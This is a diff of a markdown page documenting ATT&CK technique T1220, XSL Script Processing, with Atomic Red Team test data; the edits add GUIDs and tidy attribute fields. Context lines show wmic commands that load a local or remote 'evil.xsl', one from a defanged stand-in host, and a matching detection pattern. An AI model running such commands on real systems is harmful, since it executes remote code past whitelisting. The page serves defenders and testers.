@@ -22,14 +22,20 @@ Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)
 * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
 * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: ['Anti-virus', 'Application whitelisting', 'Digital Certificate Validation']
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['User']
 * Platforms: ['Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1220
 
@@ -143,7 +149,8 @@ wmic.exeos|get|/FORMAT|.xsl
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - XSL Script Processing': {'atomic_tests': [{'dependencies': [{'description': 'XML '
+[{'Atomic Red Team Test - XSL Script Processing': {'atomic_tests': [{'auto_generated_guid': 'ca23bfb2-023f-49c5-8802-e66997de462d',
+                                                                     'dependencies': [{'description': 'XML '
                                                                                                       'file '
                                                                                                       'must '
                                                                                                       'exist '
@@ -275,7 +282,8 @@ wmic.exeos|get|/FORMAT|.xsl
                                                                              'local '
                                                                              'files',
                                                                      'supported_platforms': ['windows']},
-                                                                    {'description': 'Executes '
+                                                                    {'auto_generated_guid': 'a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985',
+                                                                     'description': 'Executes '
                                                                                     'the '
                                                                                     'code '
                                                                                     'specified '
@@ -340,7 +348,8 @@ wmic.exeos|get|/FORMAT|.xsl
                                                                              'remote '
                                                                              'files',
                                                                      'supported_platforms': ['windows']},
-                                                                    {'dependencies': [{'description': 'XSL '
+                                                                    {'auto_generated_guid': '1b237334-3e21-4a0c-8178-b8c996124988',
+                                                                     'dependencies': [{'description': 'XSL '
                                                                                                       'file '
                                                                                                       'must '
                                                                                                       'exist '
@@ -417,7 +426,8 @@ wmic.exeos|get|/FORMAT|.xsl
                                                                              'XSL '
                                                                              'file',
                                                                      'supported_platforms': ['windows']},
-                                                                    {'description': 'Executes '
+                                                                    {'auto_generated_guid': '7f5be499-33be-4129-a560-66021f379b9b',
+                                                                     'description': 'Executes '
                                                                                     'the '
                                                                                     'code '
                                                                                     'specified '
